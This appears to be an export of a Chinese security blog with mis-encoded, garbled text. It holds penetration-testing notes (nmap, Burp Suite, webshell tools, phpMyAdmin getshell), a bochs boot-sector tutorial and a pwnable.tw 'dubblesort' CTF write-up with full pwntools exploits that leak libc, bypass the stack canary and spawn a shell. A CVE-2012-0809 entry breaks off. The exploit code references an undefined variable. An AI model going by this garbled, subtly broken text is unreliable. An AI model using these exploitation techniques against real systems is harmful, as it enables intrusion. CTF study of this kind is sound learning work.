æ¡¥æ¥æ¨¡å¼\n\næ¡¥æ¥æ¨¡å¼å¯ä»¥å°†è™šæ‹Ÿæœºæ¡¥æ¥åˆ°hostä¸»æœºçš„æŸä¸ªç½‘å¡ä¸Šã€‚æ­¤æ—¶ä¼šåˆ†é…ç»™è™šæ‹Ÿä¸€ä¸ªè·Ÿhostä¸»æœºç½‘ç»œå·ç›¸åŒçš„ipåœ°å€ï¼Œå¯ä»¥çœ‹ä½œåœ¨ç½‘ç»œä¸­æ–°å¢åŠ äº†ä¸€å°ä¸»æœºï¼Œåªä¸è¿‡è™šæ‹Ÿæœºå’Œhostæœºä¸¤ä¸ªå…±ç”¨åŒä¸€ç½‘å¡ã€‚è¿›å…¥è·¯ç”±å™¨ç®¡ç†ç•Œé¢ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åŒä¸€è®¾å¤‡ä¸‹æœ‰ä¸¤ä¸ªipåœ°å€åˆ†æ—¶å‡ºç°ï¼Œå³å¯¹ä¸€å¼ ç½‘å¡çš„åˆ†æ—¶å¤ç”¨ã€‚\n\n# nmap\n\nå¸¸ç”¨å‘½ä»¤ï¼š\n\n```\nnmap <ip> æ‰«æç›®æ ‡ä¸»æœºï¼Œè·å–åŸºæœ¬ä¿¡æ¯\nnmap -A -p- <IP> å…¨é¢æ‰«æç›®æ ‡ä¸»æœºå¼€æ”¾çš„ç«¯å£\nnmap -O <ip> æ‰«æç›®æ ‡ä¸»æœºçš„æ“ä½œç³»ç»Ÿç±»å‹\nnmap -sT TCPæ‰«æ\nnmap -sS SYNæ‰«æ\nnmap -sP PINGæ‰«æ\nnmap -sU UDPæ‰«æ\n```\n\n\n\n\n\n# http\n\n- äº†è§£\n- httpåŒ…\n\nhttpï¼ŒHyper Text Transfer Protocolï¼Œè¶…æ–‡æœ¬ä¼ è¾“åè®®ã€‚å®ƒæ˜¯ç”¨äºä»æœåŠ¡å™¨ä¼ è¾“è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€ï¼ˆHTMLï¼‰åˆ°å®¢æˆ·ç«¯çš„ä¼ é€åè®®ã€‚\n\nHTTPåè®®é€šå¸¸ç”¨äºB/Sæ¶æ„ï¼ˆBrowser/Clientï¼‰ã€‚æµè§ˆå™¨ä½œä¸ºhttpçš„å®¢æˆ·ç«¯ï¼Œé€šè¿‡URLå‘httpæœåŠ¡ç«¯å³webæœåŠ¡å™¨å‘é€è¯·æ±‚ã€‚httpæœåŠ¡ç«¯æ ¹æ®è¯·æ±‚å†å‘é€å“åº”ã€‚\n\nå‚è€ƒ[ååˆ†é’Ÿææ‡‚HTTPå’ŒHTTPSåè®®ï¼Ÿ](https://zhuanlan.zhihu.com/p/72616216)è¿™ç¯‡æ–‡ç« ï¼Œå¯ä»¥å¯¹httpã€httpsã€sslã€tlsæœ‰ä¸ªåˆæ­¥çš„è®¤è¯†ã€‚\n\nå¦ä¸€ç¯‡[å…³äºHTTPåè®®ï¼Œä¸€ç¯‡å°±å¤Ÿäº†](https://www.jianshu.com/p/80e25cb1d81a)\n\n\n\n\n\n# phpstudy\n\n- 1ã€å­¦php\n- 2ã€apache phpçš„å·¥ä½œåŸç†\n\n- 3ã€å­¦mysql\n- 4ã€mysqlå·¥ä½œåŸç†\n\n1ã€ç†Ÿæ‚‰äº†ä¸€ä¸‹phpstudyè¿™ä¸ªå·¥å…·ï¼š[phpstudy 2016 ä½¿ç”¨è¯´æ˜æ•™ç¨‹ï¼ˆå›¾æ–‡ï¼‰](https://www.xp.cn/wenda/376.html)\n\n2ã€å¤§è‡´äº†è§£äº†ä¸€ä¸‹phpçš„è¯­æ³•\n\n3ã€ä»€ä¹ˆæ˜¯apacheï¼Œapacheä¸phpä¹‹é—´çš„å…³ç³»\n\n[apacheæ˜¯ä»€ä¹ˆ](https://blog.csdn.net/mazhaer/article/details/52966568)\n\n[apacheæ˜¯ä»€ä¹ˆï¼Ÿä»–å’ŒDjangoæœ‰ä»€ä¹ˆå…³ç³»ï¼Ÿ](https://blog.csdn.net/weixin_38172774/article/details/104773354)\n\n4ã€ä»€ä¹ˆæ˜¯æ•°æ®åº“ä»¥åŠMySQL\n\n[MySQLæ˜¯ä»€ä¹ˆï¼Ÿ](https://www.yiibai.com/mysql/what-is-mysql.html)\n\n\n\n\n\n# burpsuit æ”¶å‘åŒ…\n\n- åŸºæœ¬ä½¿ç”¨ï¼Œæ”¶ï¼Œå‘ï¼Œæ‰“æ–­ç‚¹ï¼Œæ”¹\n\n1ã€å‚è€ƒæ–‡ç« â€”â€”[burpsuiteå®æˆ˜æŒ‡å—](https://t0data.gitbooks.io/burpsuite/content/)ï¼Œçœ‹æœ€å‰é¢å‡ ä¸ªå°èŠ‚ï¼Œå¤§æ¦‚äº†è§£ä¸€ä¸‹burpsuiteå¸¸ç”¨çš„å‡ ä¸ªåŠŸèƒ½ã€‚\n\n2ã€burpsuiteæ‹¦æˆªhttpsæŠ¥æ–‡ä¹‹å‰ï¼Œéœ€è¦å…ˆè®¾ç½®ä¸€ä¸‹è¯ä¹¦ï¼Œå…·ä½“æ“ä½œå‚è€ƒ[Burp SuiteæŠ“HTTPSæ•°æ®åŒ…ï¼ˆé€šç”¨ï¼‰](https://blog.csdn.net/zyw_anquan/article/details/47904495)\n\n\n\n\n\n# wireshark çœ‹æµé‡\n\n\n\n\n\n\n\n# åé—¨å·¥å…·\n\nèœåˆ€ï¼Œèšå‰‘ï¼Œå†°èï¼Œå“¥æ–¯æ‹‰\n\n- ä¼šç”¨\n\n1ã€ä¸­å›½èœåˆ€\n\nåˆ†Windowså¹³å°å’ŒLinuxå¹³å°çš„èœåˆ€ã€‚\n\n\n\n## èšå‰‘\n\nå®‰è£…è¿‡ç¨‹ä¸­å‡ºäº†ç‚¹é—®é¢˜ï¼Œå‚è€ƒè¿™ç¯‡æ–‡ç« è§£å†³â€”â€”[ä¸­å›½èšå‰‘å®‰è£…æ­¥éª¤ï¼ˆwin10 64ï¼‰ æŠ¥é”™ï¼šè§£å‹ä»£ç å‡ºé”™ï¼š[object Object]](https://blog.csdn.net/Ahuuua/article/details/109034528)\n\n\n\n# ç›®å½•æ‰«æ\n\nå¾¡å‰‘ï¼Œ\n\n- ä¼šç”¨\n\n\n\n\n\n# others\n\n## phpmyadmin\n\nå‡ ç§getshellçš„æ–¹å¼ï¼šhttps://www.cnblogs.com/muxueblog/p/13043768.html\n\n## hackbar\n\nå¥½ç”¨çš„debianç³»ç»ŸåŒ…ç®¡ç†å·¥å…·â€”â€”aptitude\n\n```\nsudo apt-get install aptitude\n```\n\n\n\n## meterpreter\n\nmeterpreterä¸­æ‰§è¡Œshellï¼Œå¯ä»¥è·å–shellè¡Œ\n\n[meterpreterè¿›shellåä¹±ç é—®é¢˜çš„è§£å†³æ–¹æ¡ˆ](https://my.oschina.net/u/4587410/blog/4688382)\n","tags":["ç½‘ç»œæ¸—é€"],"categories":["åŸºç¡€æŠ€èƒ½"]},{"title":"bochs usage","url":"/2021/08/08/bochs-usage/","content":"\n\n\n# å®‰è£…bochs\n\nbochsæ˜¯ä¸€ä¸ªæ¨¡æ‹Ÿå™¨ï¼Œubuntuä¸‹å®‰è£…aptè¿‡ç¨‹å¦‚ä¸‹ï¼š\n\n```shell\nsudo apt install bochs\nsudo apt install bochs-sdl\t\t#ä¸‹é¢å‡ ä¸ªæ’ä»¶ä¹Ÿå®‰è£…ä¸Šï¼Œå¦åˆ™bochså¯èƒ½æ— æ³•å¯åŠ¨\nsudo apt install bochs-term\nsudo apt install bochs-wx\nsudo apt install bochs-x\nsudo apt install bochsbios\n```\n\nå¦å¤–ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ä¸‹è½½[bochsæºç ](https://github.com/lubomyr/bochs)è‡ªè¡Œç¼–è¯‘ã€‚\n\n# ä½¿ç”¨bochs\n\nè¿™é‡Œä»¥åˆ›å»ºä¸€ä¸ªå¼•å¯¼æ–‡ä»¶ï¼Œå¹¶å¯åŠ¨bochsä¸ºä¾‹ã€‚\n\n1. åˆ›å»ºä¸€ä¸ªæ±‡ç¼–æ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨nasmç¼–è¯‘è¯¥æ–‡ä»¶ç”Ÿæˆboot.bin\n\n   - åˆ›å»ºä¸€ä¸ªboot.asmæ–‡ä»¶ï¼Œè¾“å…¥ä¸€ä¸‹å†…å®¹ï¼Œå‚è€ƒè‡ª[bochsä½¿ç”¨æ•™ç¨‹[Linuxç¯‡]](https://www.jianshu.com/p/742a61ce3e58)\n\n   ```assembly\n   org 07c00h ; å‘Šè¯‰ç¼–è¯‘å™¨ç¨‹åºåŠ è½½åˆ° 7c00å¤„   \n       mov ax, cs   \n       mov ds, ax   \n       mov es, ax                       \n       call DispStr ; è°ƒç”¨æ˜¾ç¤ºå­—ç¬¦ä¸²ä¾‹ç¨‹   \n       jmp $ ; æ— é™å¾ªç¯   \n   DispStr:   \n       mov ax, BootMessage   \n       mov bp, ax ; es:bp = ä¸²åœ°å€   \n       mov cx, 16 ; cx = ä¸²é•¿åº¦   \n       mov ax, 01301h ; ah = 13, al = 01h   \n       mov bx, 000ch ; é¡µå·ä¸º 0(bh = 0) é»‘åº•çº¢å­—(bl = 0Ch,é«˜äº®)   \n       mov dl, 0   \n       int 10h ; 10h å·ä¸­æ–­   \n       ret   \n   BootMessage:   \n       db \"Hello, OS world!\"   \n       times 510-($-$$) db 0 ; å¡«å……å‰©ä¸‹çš„ç©ºé—´ï¼Œä½¿ç”Ÿæˆçš„äºŒè¿›åˆ¶ä»£ç æ°å¥½ä¸º   \n       dw 0xaa55 ; ç»“æŸæ ‡å¿—\n   ```\n\n   - ä½¿ç”¨`nasm boot.asm -o boot.bin`å°†ä»¥ä¸Šæ±‡ç¼–ä»£ç ç¼–è¯‘æˆäºŒè¿›åˆ¶æ–‡ä»¶\n\n2. åˆ›å»ºä¸€ä¸ªæ˜ åƒè½¯ç›˜ï¼Œå¹¶å°†boot.binå†™å…¥è½¯ç›˜ä¸­\n\n   - ä½¿ç”¨bximageåˆ›å»ºè½¯ç›˜ï¼Œå‚è€ƒè‡ª[å®ç°æ“ä½œç³»ç»Ÿä¹‹ç¯å¢ƒæ­å»º](http://www.360doc.com/content/15/0331/11/12129652_459507015.shtml)\n\n   ```shell\n   $ bximage\n   ========================================================================\n                                   bximage\n                     Disk Image Creation Tool for Bochs\n             $Id: bximage.c 11315 2012-08-05 18:13:38Z vruppert $\n   ========================================================================\n   \n   Do you want to create a floppy disk image or a hard disk image?\n   Please type hd or fd. [hd] fd\n   \n   Choose the size of floppy disk image to create, in megabytes.\n   Please type 0.16, 0.18, 0.32, 0.36, 0.72, 1.2, 1.44, 1.68, 1.72, or 2.88.\n    [1.44] \n   I will create a floppy image with\n     cyl=80\n     heads=2\n     sectors per track=18\n     total sectors=2880\n     total bytes=1474560\n   \n   What should I name the image?\n   [a.img] \n   \n   Writing: [] Done.\n   \n   I wrote 1474560 bytes to a.img.\n   \n   The following line should appear in your bochsrc:\n     floppya: image=\"a.img\", status=inserted\n   $ ls\n   a.img\n   ```\n\n   - å°†ç¬¬ä¸€æ­¥ç”Ÿæˆçš„boot.binå†™å…¥è½¯ç›˜æ˜ åƒa.imgä¸­\n\n   ```\n   dd if=boot.bin of=a.img bs=512 count=1 conv=notrunc\n   ```\n\n3. åˆ›å»ºbochsçš„é…ç½®æ–‡ä»¶\n\n   - åˆ›å»ºä¸€ä¸ªé…ç½®æ–‡ä»¶bochs.rcå‚è€ƒ[Bochsç®€æ˜“æ•™ç¨‹](http://www.edu2act.cn/article/bochsjian-yi-jiao-cheng/)\n\n   ```shell\n   megs:32 \t\t# æŒ‡å®šè™šæ‹Ÿç³»ç»Ÿä¼šè¢«åˆ†é…çš„å†…å­˜å¤§å°32MB\n   romimage:flie=/usr/share/bochs/BIOS-bochs-latest \t\t#è®¾ç½®åŠ è½½è·¯å¾„å¯¹åº”çœŸå®æœºå™¨çš„BIOS \n   vgaromimage:file=/usr/share/bochs/VGABIOS-lgpl-latest \t\t#è®¾ç½®åŠ è½½è·¯å¾„å¯¹åº”çœŸå®æœºå™¨çš„VGABIOS\n   floppya:1_44=a.img,status=inserted \t\t# floppyaæ˜¯ç¬¬ä¸€è½¯é©±ï¼Œfloppybæ˜¯ç¬¬äºŒè½¯é©±ã€‚åé¢æ ‡æ˜çš„æ˜¯è½¯é©±é•œåƒæ–‡ä»¶çš„ä½ç½®(boot.imgæ˜¯è‡ªå·±å†™çš„å¼•å¯¼åŠ è½½ç¨‹åº)ï¼Œè½¯ç›˜æ˜¯å¦æ’å…¥\n   boot: a \t\t# é€‰æ‹©æ‰€å¯åŠ¨çš„ç›˜ç¬¦ç±»å‹ \n   ```\n\n4. ä½¿ç”¨é…ç½®æ–‡ä»¶å¯åŠ¨bochs\n\n   - å¯åŠ¨bochsçš„å‘½ä»¤å¦‚ä¸‹\n\n   ```shell\n   bochs -f bochs.rc\n   c\t\t# æ‰§è¡Œcä¹‹å‰ï¼Œå¯ä»¥ä¸‹æ–­ç‚¹ï¼Œç„¶åè°ƒè¯•å¯åŠ¨è¿‡ç¨‹\n   ```\n\n# ç»ƒä¹ bochsé¢˜ç›®\n\nè¿™ä¸€å°èŠ‚å¾…æ•´ç†\n\n- 0x7c00\n\n\n\n- square ctf 2017 - floppy\n\nhttps://github.com/oh-iowned/ctf-writeups/blob/master/2017/square-ctf/floppy/README.md\n\nhttp://www.actforit.com/wp/reverse/square-ctf-2017-floppy-web-1000-pts/\n\n\n\n- flare on ctf 2018 ï¼ˆä¾§é‡é€†å‘ï¼‰\n\nhttps://blog.attify.com/flare-on-5-writeup-part9/\n\nhttps://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/FlareOn5_Challenge12_Solution.pdf\n\nhttps://emanuelecozzi.net/posts/ctf/flareon-2018-challenge-12-cat-grep-writeup/\n\nhttps://www.fireeye.com/blog/threat-research/2018/10/2018-flare-on-challenge-solutions.html\n\n\n\n\n\n\n\n\n\n","tags":["bochs"],"categories":["CTF"]},{"title":"pwnable.twä¹‹dubblesort","url":"/2021/05/15/pwnable-tw-dubblesort/","content":"\né¢˜ç›®æ–‡ä»¶å¦‚ä¸‹ï¼š\n\n[dubblesort](https://pwnable.tw/static/chall/dubblesort)\n\n[libc.so](https://pwnable.tw/static/libc/libc_32.so.6)\n\n# åˆ†æè¿‡ç¨‹\n\né¦–å…ˆæŸ¥çœ‹äºŒè¿›åˆ¶åŸºæœ¬ä¿¡æ¯ï¼š\n\n```shell\n$ file dubblesort \ndubblesort: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=12a217baf7cbdf2bb5c344ff14adcf7703672fb1, stripped\n\n$ checksec dubblesort\n[*] '/home/bling/pwnable_tw/dubblesort/dubblesort'\n    Arch:     i386-32-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n    FORTIFY:  Enabled\n```\n\nIDAåˆ†æä¼ªä»£ç æµç¨‹ï¼Œå¦‚ä¸‹ä»£ç ä¸­å°†å‡ ä¸ªæ¼æ´ç‚¹æ ‡è®°å‡ºæ¥äº†ã€‚\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  unsigned int v3; // eax\n  _BYTE *v4; // edi\n  unsigned int i; // esi\n  unsigned int j; // esi\n  int result; // eax\n  unsigned int v8; // [esp+18h] [ebp-74h] BYREF\n  _BYTE v9[32]; // [esp+1Ch] [ebp-70h] BYREF\n  char buf[64]; // [esp+3Ch] [ebp-50h] BYREF\n  unsigned int v11; // [esp+7Ch] [ebp-10h]\n\n  v11 = __readgsdword(0x14u);\n  sub_8B5();\n  __printf_chk(1, \"What your name :\");\n  read(0, buf, 0x40u);\n  __printf_chk(1, \"Hello %s,How many numbers do you what to sort :\");\t\t//readå‡½æ•°ä¸ä¼šåœ¨è¾“å…¥ç»“å°¾ç½®\"\\x00\"ï¼Œå¯¼è‡´ä½¿ç”¨\"%s\"æ ¼å¼åŒ–è¾“å‡ºæ—¶è¶Šç•Œæ‰“å°ï¼Œé€ æˆä¿¡æ¯æ³„éœ²\n  __isoc99_scanf(\"%u\", &v8);\n  v3 = v8;\n  if ( v8 )\n  {\n    v4 = v9;\n    for ( i = 0; i < v8; ++i )\t\t//æœªé™åˆ¶v8çš„å¤§å°ï¼Œå¯¼è‡´å¾ªç¯ä¸­å¯¹åœ°å€v4çš„å†™å…¥è¿‡ç¨‹äº§ç”Ÿæ ˆæº¢å‡º\n    {\n      __printf_chk(1, \"Enter the %d number : \");\n      fflush(stdout);\n      __isoc99_scanf(\"%u\", v4);\t\t\t// scanfå‡½æ•°åœ¨æ ¼å¼åŒ–å­—ç¬¦ç±»å‹ä¸å®é™…ç±»å‹ä¸åŒ¹é…æ—¶ï¼Œä¸ä¼šå¾€æ ˆä¸Šå†™å…¥å†…å®¹ï¼Œç›´æ¥è¿›å…¥ä¸‹ä¸€æ­¥\n      v3 = v8;\n      v4 += 4;\n    }\n  }\n  sub_931(v9, v3);\t\t\t//è¿™é‡Œå°±æ˜¯ä¸€ä¸ªæ’åºå‡½æ•°ï¼Œåˆ©ç”¨çš„æ—¶å€™è¦è€ƒè™‘è¾“å…¥æ•°æ®å¤§å°çš„ä¸åŒï¼Œä¼šå¯¼è‡´æœ€ååœ¨æ ˆä¸Šå­˜å‚¨é¡ºåºä¸åŒ\n  puts(\"Result :\");\n  if ( v8 )\n  {\n    for ( j = 0; j < v8; ++j )\n      __printf_chk(1, \"%u \");\n  }\n  result = 0;\n  if ( __readgsdword(0x14u) != v11 )\n    sub_BA0();\n  return result;\n}\n```\n\n\n\n## é€šè¿‡readå‡½æ•°æ³„éœ²ä¿¡æ¯\n\n> readå‡½æ•°æ¥æ”¶è¾“å…¥åï¼ˆæŠŠ'\\n'ä¹Ÿå½“ä½œä¸€ä¸ªå­—ç¬¦ï¼‰ï¼Œå¹¶ä¸ä¼šåœ¨æœ«å°¾æ·»åŠ \"\\x00\"ã€‚é‚£ä¹ˆå¦‚æœåç»­ä»¥\"%s\"å¯¹è¯¥è¾“å…¥è¿›è¡Œè¾“å‡ºæ“ä½œï¼Œå°±ä¼šè¶Šç•Œæ‰“å°ï¼Œé€ æˆä¿¡æ¯æ³„éœ²ã€‚\n\néšä¾¿è¾“å…¥å‡ ä¸ªå­—æ¯ï¼Œå¯ä»¥çœ‹åˆ°æ‰“å°å‡ºäº†ä¹±ç ã€‚å¤šæ‰“å°å‡ºæ¥çš„å­—ç¬¦æ¥è‡ªäºæ ˆä¸Šï¼Œæ ˆä¸Šå¯èƒ½å­˜æœ‰libcçš„åœ°å€ï¼Œå› æ­¤è€ƒè™‘ç”¨è¿™ä¸ªæ¼æ´æ³„éœ²libcåŸºå€ã€‚\n\n![](image-20210515183536310.png)\n\nä¸‹å›¾å±•ç¤ºäº†æœ¬åœ°æ ˆç©ºé—´å†…å®¹ï¼Œè¾“å…¥çš„æ˜¯â€˜aaaaâ€™ï¼ˆå¯¹åº”0xffffce4cå¤„çš„0x61616161ï¼‰ï¼Œå¯ä»¥çœ‹åˆ°0x61616161åçš„æ ˆç©ºé—´å†…æœ‰å¾ˆå¤šf7å¼€å¤´çš„ã€é•¿å¾—å¾ˆåƒåœ°å€çš„å€¼ã€‚å¯¹åº”åˆ°vmmapè·å–çš„è¿›ç¨‹ç©ºé—´ï¼Œç›®æ ‡é›†ä¸­åœ¨äº†â€œ0xf7fb2000â€è¿™ä¸ªå€¼ã€‚è¾“å…¥çš„ç¬¬å…­å’Œç¬¬ä¸ƒä¸ªå•å…ƒéƒ½æ˜¯å®ƒï¼Œç»è¿‡å®è·µï¼Œæœ¬åœ°æ³„éœ²ç¬¬å…­ä¸ªå•å…ƒèƒ½æˆåŠŸï¼Œè¿œç¨‹æ³„éœ²ç¬¬ä¸ƒä¸ªå•å…ƒæ‰èƒ½æˆåŠŸã€‚\n\nå¦å¤–è¿˜æœ‰ä¸€ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹ï¼Œæœ¬åœ°è°ƒè¯•ä¸­0xf7fb2000å¯¹åº”libcçš„got.pltæ®µï¼Œå…¶åŠ è½½åç§»é€šè¿‡`readelf -S /lib/i386-linux-gnu/libc-2.27.so`å¾—åˆ°æ˜¯0x1d8000ï¼Œå› æ­¤æœ¬åœ°åˆ©ç”¨æ—¶libcåŸºå€ä¸º`0xf7fb2000 - 0x1d8000`ã€‚\n\nè€Œè¿œç«¯libcè·Ÿæœ¬åœ°ä¸ä¸€æ ·ï¼Œå…¶got.pltæ®µåŠ è½½åç§»é€šè¿‡`readelf -S libc_32.so.6`å¾—åˆ°æ˜¯0x1b0000ã€‚å› æ­¤åœ¨æ‰“è¿œç¨‹çš„æ—¶å€™ï¼Œéœ€è¦ç”¨`æ³„éœ²åœ°å€ - 0x1b0000`æ¥å¾—åˆ°lbicåŸºå€ã€‚\n\n![](image-20210515121957899.png)\n\n## æœªé™åˆ¶numberså¤§å°å¯¼è‡´æ ˆæº¢å‡º\n\næºç ä¸­V8æ˜¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®ï¼Œæœªåšé™åˆ¶ä¾¿ä½œä¸ºforå¾ªç¯çš„æ¡ä»¶ï¼Œå¯¼è‡´å¯ä»¥å¾€æ ˆä¸Šå†™ä»»æ„é•¿åº¦çš„æ•°æ®ã€‚\n\n```c\n  if ( v8 )\n  {\n    v4 = v9;\n    for ( i = 0; i < v8; ++i )\n    {\n      __printf_chk(1, \"Enter the %d number : \");\n      fflush(stdout);\n      __isoc99_scanf(\"%u\", v4);\n      v3 = v8;\n      v4 += 4;\n    }\n  }\n```\n\n## é€šè¿‡scanfå‡½æ•°ç»•è¿‡canary\n\n> scanfå‡½æ•°åœ¨æ ¼å¼å­—ç¬¦ç±»å‹å’Œè¾“å…¥å­—ç¬¦ç±»å‹ä¸åŒ¹é…æ—¶ï¼Œä¸ä¼šå°†å†…å®¹å†™å…¥æ ˆä¸Šï¼Œä¹Ÿä¸ä¼šæŠ¥é”™ï¼Œè€Œæ˜¯ç»§ç»­æ‰§è¡Œã€‚\n\næœ¬é¢˜ä¸­åˆ©ç”¨scanfçš„è¿™ä¸ªç‰¹æ€§ï¼Œå¯ä»¥ç»•è¿‡canaryçš„é™åˆ¶ã€‚\n\nscanf(\"%u\",v4)ï¼š\n\n- å½“è¾“å…¥çš„v4ä¸ºå­—æ¯æ—¶ï¼Œä¼šè¢«å®šä¹‰ä¸ºéæ³•å­—ç¬¦ï¼Œè™½ç„¶ä¸ä¼šå¾€æ ˆä¸Šå†™æ•°æ®ï¼Œä½†è¿™ä¸ªå­—æ¯ä¼šä¸€ç›´å­˜åœ¨äºè¾“å…¥ç¼“å†²åŒºï¼Œå¯¼è‡´ä¸€ç›´æ— æ³•è¾“å…¥ã€‚\n- è€Œå½“è¾“å…¥ä¸º'+' '-'è¿™ä¸¤ä¸ªå­—ç¬¦æ—¶ï¼Œç”±äºä»–ä»¬å¯ä»¥å®šä¹‰æ•°å­—çš„æ­£è´Ÿï¼Œå› æ­¤ä¸ä¼šè¢«å®šä¹‰ä¸ºéæ³•å­—ç¬¦ã€‚åŒæ—¶å•ç‹¬è¾“å…¥è¯¥å­—ç¬¦åˆèƒ½è¾¾åˆ°ä¸å¾€æ ˆä¸Šå†™å…¥æ•°æ®çš„ç›®çš„ã€‚\n\n```\n  if ( v8 )\n  {\n    v4 = v9;\n    for ( i = 0; i < v8; ++i )\n    {\n      __printf_chk(1, \"Enter the %d number : \");\n      fflush(stdout);\n      __isoc99_scanf(\"%u\", v4);\n      v3 = v8;\n      v4 += 4;\n    }\n  }\n```\n\n![](image-20210515190651246.png)\n\n\n\n# EXP\n\n## æœ¬åœ°\n\n```python\nfrom pwn import *\ncontext(arch=\"i386\",os=\"linux\",log_level=\"debug\")\nmyelf = ELF(\"./dubblesort\")\npr = process(myelf.path)\n\n# leak libc base\npr.recvuntil(\"What your name :\")\npr.sendline(\"aaaabbbbccccddddeeee\")\npr.recvuntil(\"eeee\\n\")\nlibc = pr.recvuntil(\",\")[:3].ljust(4,\"\\x00\")\nlibc = u32(test1)<<8\nlog.warn(\"leak libc : 0x%x\" % test1)\n\nlibc_base_remote = libc - 0x1b0000\nlog.warn(\"libc base: 0x%x\" % libc_base_remote)\nsys_remote = libc_base_remote + 0x3A940\nbinsh_remote = libc_base_remote + 0x158E8B\n\n# gadget_addr = libc_base_local + 0x67bdf    # fail\n\n# stack overflow\npr.recvuntil(\"do you what to sort :\")\npr.sendline(str(35))\n# gdb.attach(pr,'b fflush \\n c')\nfor i in range(24):\n    pr.recvuntil(\"number : \")\n    pr.sendline(str(i))\n\npr.recvuntil(\"number : \")\npr.sendline('+')\n\nfor j in range(7):\n    pr.recvuntil(\"number : \")\n    pr.sendline(str(0xeeeeeee0+j))\n\npr.recvuntil(\"number : \")\npr.sendline(str(sys_remote))\npr.recvuntil(\"number : \")\npr.sendline(str(sys_remote+0x10))\npr.recvuntil(\"number : \")\npr.sendline(str(binsh_remote))\n\npr.interactive()\n```\n\n\n\n## è¿œç¨‹\n\n```python\nfrom pwn import *\ncontext(arch=\"i386\",os=\"linux\",log_level=\"debug\")\npr = remote('chall.pwnable.tw',10101)\n\n# leak libc base\npr.recvuntil(\"What your name :\")\npr.sendline(\"aaaabbbbccccddddeeeeffff\")\npr.recvuntil(\"ffff\\n\")\nlibc = pr.recvuntil(\",\")[:3].ljust(4,\"\\x00\")\nlibc = u32(test1)<<8\nlog.warn(\"leak libc : 0x%x\" % test1)\n\nlibc_base_remote = libc - 0x1b0000\nlog.warn(\"libc base: 0x%x\" % libc_base_remote)\nsys_remote = libc_base_remote + 0x3A940\nbinsh_remote = libc_base_remote + 0x158E8B\n\n# stack overflow\npr.recvuntil(\"do you what to sort :\")\npr.sendline(str(35))\n\n# æ„é€ 0->23,canary,0xeeeeeee0,~1,~2,~3,~4,~5,~6,sys_addr,sys_addr+0x10,binsh_addr\n# æ’åºåï¼Œä¾ç„¶æ˜¯ä»¥ä¸Šé¡ºåºï¼Œ\nfor i in range(24):\n    pr.recvuntil(\"number : \")\n    pr.sendline(str(i))\n\npr.recvuntil(\"number : \")\npr.sendline('+')\t\t# åœ¨canaryå¤„ä¸å†™å…¥\n\nfor j in range(7):\n    pr.recvuntil(\"number : \")\n    pr.sendline(str(0xeeeeeee0+j))\n\npr.recvuntil(\"number : \")\npr.sendline(str(sys_remote))\npr.recvuntil(\"number : \")\npr.sendline(str(sys_remote+0x10))\npr.recvuntil(\"number : \")\npr.sendline(str(binsh_remote))\n\npr.interactive()\n```\n\n\n\n\n\n# å‚è€ƒ\n\n[pwnable.twåˆ·é¢˜ä¹‹dubblesort](https://www.freebuf.com/articles/others-articles/134271.html)","tags":["read func","scanf func"],"categories":["CTF"]},{"title":"CVE-2012-0809æ¼æ´å¤ç°","url":"/2021/03/28/CVE-2012-0809/","content":"\n# ä¸å®šé•¿å‚æ•°çš„å‡½æ•°\n\næœ€å¸¸è§çš„ä¸¤ä¸ªä¸å®šé•¿å‚æ•°çš„å‡½æ•°å°±æ˜¯`scanf`å’Œ`printf`ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°çš„å®šä¹‰å¦‚ä¸‹ï¼š\n\n```c\nint printf(const char *format, ...)\nint scanf(const char *format, ...)\n```\n\nå…¶ä¸­ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œç¬¬äºŒä¸ªå‚æ•°`...`è¡¨æ˜å‚æ•°ä¸ªæ•°æ˜¯ä¸å®šçš„ã€‚å‚æ•°ä¸ªæ•°æŒ‰ç…§ä¸€å®šçš„è§„åˆ™æ ¹æ®ç¬¬ä¸€ä¸ªå‚æ•°è¿›è¡Œè§£æã€‚è¿™ä¸¤ä¸ªå‡½æ•°çš„å…·ä½“å®ç°å¯ä»¥å»glibcæºç ä¸­æŸ¥çœ‹ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ä¸€èµ·çœ‹çœ‹å¦‚ä½•è‡ªå®šä¹‰ä¸€ä¸ªä¸å®šé•¿å‚æ•°çš„å‡½æ•°ã€‚\n\n## å‡ ä¸ªé‡è¦çš„å®\n\n[iOSå¼€å‘ä¸­va_listçš„åº”ç”¨](https://www.jianshu.com/p/79981610c287)\n\n[æ·±å…¥Cè¯­è¨€å¯å˜å‚æ•°(va_arg,va_list,va_start,va_end)](https://mudongliang.github.io/2017/02/20/cva_argva_listva_startva_end.html)\n\n[va_listå¯å˜å‚æ•°](https://www.cnblogs.com/embedded-linux/p/5575437.html)\n\n\n\n\n\n## å®ç°ä¸€ä¸ªä¸å®šé•¿å‚æ•°çš„å‡½æ•°\n\n[ç†è§£å¯å˜å‚æ•°va_listã€va_startã€va_argã€va_endåŸç†åŠä½¿ç”¨æ–¹æ³•](https://www.cnblogs.com/pengdonglin137/p/3345911.html)\n\n\n\n\n\n## GCC å†…ç½®å‡½æ•°ï¼Ÿï¼Ÿ\n\n[gccå†…ç½®å‡½æ•°](https://blog.csdn.net/whuzm08/article/details/73650330)\n\n\n\n# æ¼æ´åˆ†æ\n\n[CVE-2012-0809-Sudoæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´](https://www.giantbranch.cn/2017/10/31/CVE-2012-0809-Sudo%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/)\n\n[å›½å¤–æ¼æ´åˆ†æä¸å¤ç°æ–‡æ¡£](https://www.vnsecurity.net/research/2012/02/16/exploiting-sudo-format-string-vunerability.html)\n\n[sudo 